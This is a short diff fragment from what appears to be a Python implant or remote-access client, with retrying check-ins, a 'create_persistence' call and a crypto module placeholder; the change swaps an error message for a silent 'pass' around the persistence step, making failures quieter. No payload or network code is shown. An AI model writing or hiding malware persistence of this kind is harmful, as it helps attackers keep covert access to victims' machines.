@@ -276,7 +276,7 @@ CRYPTO_MODULE_PLACEHOLDER
                     self.create_persistence()
                     self.show_console_popup()
                 except Exception as e:
-                    print(f"Error during persistence or console popup: {e}")
+                    pass
                 break
             if attempt < max_checkin_retries - 1:
                 time.sleep(checkin_retry_delay)
